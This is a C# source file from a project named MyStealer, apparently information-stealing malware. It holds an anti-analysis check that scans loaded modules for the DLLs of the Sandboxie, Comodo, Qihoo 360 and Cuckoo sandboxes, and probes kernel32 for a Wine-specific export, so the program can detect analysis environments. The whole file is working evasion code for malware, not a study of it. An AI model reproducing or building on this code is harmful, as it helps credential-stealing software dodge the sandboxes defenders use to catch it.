using System;
using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Check
{
    internal class LoadedModules : CheckBase
    {
        public override string Name => "Loaded modules";

        private readonly string[] moduleNames = new string[]
        {
            "SbieDll.dll", // Sandboxie
            "cmdvrt32.dll", // Comodo Sandbox
            "cmdvrt64.dll", // Comodo Sandbox
            "SxIn.dll", // Qihoo 360 Sandbox
            "cuckoomon.dll", // Cuckoo Sandbox
        };

        public override bool CheckActive()
        {
            foreach (var name in moduleNames)
            {
                if (MyGetModuleHandle(name) != IntPtr.Zero)
                {
                    Logger.Information("Bad module {name} found.", name);
                    return true;
                }
            }

            if (MyGetProcAddress(MyGetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != IntPtr.Zero)
            {
                Logger.Information("Detected wine.");
                return true;
            }

            return false;
        }
    }
}
